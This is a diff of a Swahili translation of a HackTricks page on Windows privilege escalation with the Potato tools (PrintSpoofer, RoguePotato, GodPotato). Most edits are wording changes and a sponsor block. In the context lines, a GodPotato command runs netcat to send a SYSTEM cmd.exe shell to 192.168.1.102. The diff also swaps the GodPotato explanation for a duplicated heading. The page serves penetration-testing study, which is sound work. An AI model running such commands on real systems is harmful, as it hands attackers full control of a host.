@@ -14,13 +14,13 @@ Njia nyingine za kusaidia HackTricks:
 
 </details>
 
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
 [**WhiteIntel**](https://whiteintel.io) ni injini ya utaftaji inayotumia **dark-web** ambayo inatoa huduma za **bure** za kuangalia ikiwa kampuni au wateja wake wameathiriwa na **malware za wizi**.
 
-Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na malware za kuiba taarifa.
+Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na malware za wizi wa habari.
 
 Unaweza kutembelea tovuti yao na kujaribu injini yao **bure** kwa:
 
@@ -29,7 +29,7 @@ Unaweza kutembelea tovuti yao na kujaribu injini yao **bure** kwa:
 ---
 
 {% hint style="warning" %}
-**JuicyPotato haitumiki** kwenye Windows Server 2019 na Windows 10 toleo la 1809 na baadaye. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) inaweza kutumika kwa **kutumia haki sawa na kupata ufikiaji wa kiwango cha `NT AUTHORITY\SYSTEM`**. Chapisho hili la blogu linachunguza kwa undani zana ya `PrintSpoofer`, ambayo inaweza kutumika kudhuru haki za uigaji kwenye mwenyeji wa Windows 10 na Server 2019 ambapo JuicyPotato haifanyi kazi tena.
+**JuicyPotato haitumiki** kwenye Windows Server 2019 na Windows 10 toleo la 1809 na baadaye. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) inaweza kutumika kwa **kutumia mamlaka sawa na kupata ufikiaji wa kiwango cha `NT AUTHORITY\SYSTEM`**. Chapisho hili la blogu linachunguza kwa undani zana ya `PrintSpoofer`, ambayo inaweza kutumika kudhuru mamlaka ya uigizaji kwenye mwenyeji wa Windows 10 na Server 2019 ambapo JuicyPotato haifanyi kazi tena.
 {% endhint %}
 
 ## Onyesho Haraka
@@ -80,7 +80,7 @@ nt authority\system
 ```
 ### GodPotato
 
-GodPotato ni mchanganyiko wa RoguePotato na PrintSpoofer. Inatumia PrintSpoofer kuchapisha kwa printer ya uongo na kisha kutumia RoguePotato kutekeleza amri ya mfumo kwa kutumia uchapishaji wa printer ya uongo. Hii inaweza kusababisha kupanda kwa mamlaka kwenye mfumo.
+### GodPotato
 ```
 GodPotato -cmd "cmd /c whoami"
 GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
@@ -92,13 +92,13 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 * [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
 * [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
 
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) ni injini ya utaftaji inayotumia **dark-web** ambayo inatoa huduma za **bure** za kuangalia ikiwa kampuni au wateja wake wameathiriwa na **malware za kuiba**.
+[**WhiteIntel**](https://whiteintel.io) ni injini ya utaftaji inayotumia **dark-web** ambayo inatoa huduma za **bure** za kuangalia ikiwa kampuni au wateja wake wameathiriwa na **malwares za kuiba**.
 
-Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na malware za kuiba taarifa.
+Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na malwares za kuiba taarifa.
 
 Unaweza kutembelea tovuti yao na kujaribu injini yao **bure** kwa:
 
